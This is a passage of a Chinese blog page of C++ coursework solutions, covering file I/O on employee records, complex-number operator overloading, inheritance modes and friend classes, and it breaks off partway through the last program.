&nbsp; <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">101</span>, <span class="string">"小黄"</span>, <span class="number">23</span>, <span class="number">3100</span>),</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">102</span>, <span class="string">"中黄"</span>, <span class="number">41</span>, <span class="number">6600</span>),</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">105</span>, <span class="string">"大黄"</span>, <span class="number">55</span>, <span class="number">7000</span>),</span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; <span class="comment">//对5组数据按ID进行排序</span></span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> i, j;</span><br><span class="line">&nbsp; &nbsp; Person *temp;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">for</span>(j = i + <span class="number">1</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">if</span>(p[i] -&gt; m_Id &gt; p[j] -&gt; m_Id)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; temp = p[i];</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p[i] = p[j];</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p[j] = temp;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//将排好序的数据存入到文件f.dat</span></span><br><span class="line">&nbsp; &nbsp; <span class="function">ofstream <span class="title">outfile1</span><span class="params">(<span class="string">"f.dat"</span>, ios :: out)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!outfile1)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; outfile1 &lt;&lt; p[i] -&gt; m_Id &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Name &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Age &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; outfile<span class="number">1.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//再写入两个职工信息</span></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//示例输入 108 Titus 40 4000 109 Tulius 35 5000</span></span><br><span class="line">&nbsp; &nbsp; cout &lt;&lt; <span class="string">"请输入2个职工信息："</span>;</span><br><span class="line">&nbsp; &nbsp; <span class="function">ofstream <span class="title">outfile2</span><span class="params">(<span class="string">"f.dat"</span>, ios :: out | ios :: app)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!outfile2)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; temp = <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">0</span>, <span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&nbsp; &nbsp; cin &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; outfile2 &lt;&lt; temp -&gt; m_Id &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Name &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Age &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; cin &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; outfile2 &lt;&lt; temp -&gt; m_Id &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Name &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Age &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; outfile<span class="number">2.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//输出文件中的全部职工数据</span></span><br><span class="line">&nbsp; &nbsp; <span class="function">ifstream <span class="title">infile1</span><span class="params">(<span class="string">"f.dat"</span>, ios :: in)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!infile1)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; infile1 &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; temp -&gt; <span class="built_in">PrintInfo</span>();</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; infile<span class="number">1.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//输入一个ID检测是否存在</span></span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> id;</span><br><span class="line">&nbsp; &nbsp; cout &lt;&lt; <span class="string">"请输入一个号码："</span>;</span><br><span class="line">&nbsp; &nbsp; cin &gt;&gt; id;</span><br><span class="line">&nbsp; &nbsp; <span class="type">bool</span> isFound = <span class="literal">false</span>;</span><br><span class="line">&nbsp; &nbsp; <span class="function">ifstream <span class="title">infile2</span><span class="params">(<span class="string">"f.dat"</span>, ios :: in)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!infile2)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; infile2 &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">if</span>(temp -&gt; m_Id == id)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; temp -&gt; <span class="built_in">PrintInfo</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; isFound = <span class="literal">true</span>;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">break</span>;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!isFound)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"没有找到这个人"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; infile<span class="number">2.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="类和对象的进阶"><a href="#类和对象的进阶" class="headerlink" title="类和对象的进阶"></a>类和对象的进阶</h1><ol><li>定义一个复数类，重载运算符“+”、“-”、“<em>”、“/”，使这四个运算符能应用于复数的加减乘除运算。 复数加法：m=a+bi ,n=c+di; m+n=(a+c)+(b+d)i; 复数减法：m=a+bi ,n=c+di; m-n=(a-c)+(b-d)i; 复数乘法：m=a+bi ,n=c+di; m</em>n=(ac-bd)+(bc+ad)i;<br>复数除法：m=a+bi ,n=c+di; m/n=((ac+bd)+(bc-ad)i)/(c2+d2)。</li><li>参考教材例题11.1,11.2,11.3,11.5，分别采用公有继承，私有继承和保护继承的方式，在程序运行中，输入num，name,sex,age,addr的值，程序应输出以上五个数据的数值；</li><li>3.将教材例9.13中的Time类声明为Date的友元类，输出年月日和时分秒。</li></ol><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Complex</span>(<span class="type">double</span> x = <span class="number">0</span>, <span class="type">double</span> y = <span class="number">0</span>) :<span class="built_in">real</span>(x), <span class="built_in">imag</span>(y) {}</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">friend</span> Complex <span class="keyword">operator</span> * (Complex &amp;m, Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">friend</span> Complex <span class="keyword">operator</span> / (Complex &amp;m, Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; Complex <span class="keyword">operator</span> + (Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; Complex <span class="keyword">operator</span> - (Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">double</span> real;</span><br><span class="line">&nbsp; &nbsp; <span class="type">double</span> imag;</span><br><span class="line">};</span><br><span class="line">Complex <span class="keyword">operator</span> * (Complex &amp;m, Complex &amp;n)</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="built_in">Complex</span>(m.real*n.real - m.imag*n.imag, m.real*n.imag + m.imag*n.real);</span><br><span class="line">}</span><br><span class="line">Complex <span class="keyword">operator</span> / (Complex &amp;m, Complex &amp;n)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; Complex c;</span><br><span class="line">&nbsp; &nbsp; c.real = (m.real*n.real + m.imag*n.imag) / (n.real*n.real + n.imag*n.imag);</span><br><span class="line">&nbsp; &nbsp; c.imag = (m.imag*n.real - m.real*n.imag) / (n.real*n.real + n.imag*n.imag);</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> c;</span><br><span class="line">}</span><br><span class="line">Complex &nbsp;Complex ::<span class="keyword">operator</span> + (Complex &amp;n)</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="built_in">Complex</span>(real + n.real, imag + n.imag);</span><br><span class="line">}</span><br><span class="line">Complex &nbsp;Complex ::<span class="keyword">operator</span> - (Complex &amp;n)</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="built_in">Complex</span>(real - n.real, imag - n.imag);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Complex::display</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; cout &lt;&lt; <span class="string">"&lt;"</span> &lt;&lt; real &lt;&lt; <span class="string">","</span> &lt;&lt; imag &lt;&lt; <span class="string">"i&gt;"</span> &lt;&lt; endl;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> a,bi,c,di;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"请输入m的实部和虚部"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; cin&gt;&gt;a&gt;&gt;bi;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"请输入n的实部和虚部"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; cin&gt;&gt;c&gt;&gt;di;</span><br><span class="line">&nbsp; &nbsp; <span class="function">Complex <span class="title">m</span><span class="params">(a, bi)</span>, <span class="title">n</span><span class="params">(c, di)</span>, c3</span>;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"为"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; m.<span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"n为"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; n.<span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"计算结果为"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; c3 = m + n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; c3 = m - n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; c3 = m * n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; c3 = m / n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;num&gt;&gt;name&gt;&gt;sex;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"num: "</span>&lt;&lt;num&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"name: "</span>&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"sex: "</span>&lt;&lt;sex&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span> :</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> num;</span><br><span class="line">&nbsp; &nbsp; string name;</span><br><span class="line">&nbsp; &nbsp; <span class="type">char</span> sex;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student1</span>:<span class="keyword">public</span> Student</span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">get_value</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"age: "</span>&lt;&lt;age&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"address: "</span>&lt;&lt;addr&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> age;</span><br><span class="line">&nbsp; &nbsp; string addr;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student2</span>:<span class="keyword">private</span> Student</span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">get_value</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"age: "</span>&lt;&lt;age&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"address: "</span>&lt;&lt;addr&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> age;</span><br><span class="line">&nbsp; &nbsp; string addr;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student3</span>:<span class="keyword">protected</span> Student</span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">get_value</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"age: "</span>&lt;&lt;age&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"address: "</span>&lt;&lt;addr&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> age;</span><br><span class="line">&nbsp; &nbsp; string addr;</span><br><span class="line">};</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; Student1 stud1;</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">1.</span><span class="built_in">get_value1</span>();</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">1.</span><span class="built_in">display1</span>();</span><br><span class="line">&nbsp; &nbsp; Student2 stud2;</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">2.</span><span class="built_in">get_value1</span>();</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">2.</span><span class="built_in">display1</span>();</span><br><span class="line">&nbsp; &nbsp; Student3 stud3;</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">3.</span><span class="built_in">get_value1</span>();</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">3.</span><span class="built_in">display1</span>();</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Time</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Time</span>(<span class="type">int</span> h, <span class="type">int</span> m, <span class="type">int</span> s): <span class="built_in">hour</span>(h), <span class="built_in">minute</span>(m), <span class="built_in">sec</span>(s) {};</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(Date &amp;)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> hour;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> minute;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> sec;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span></span><br><span class="line">{</span><br><span class="line"><span 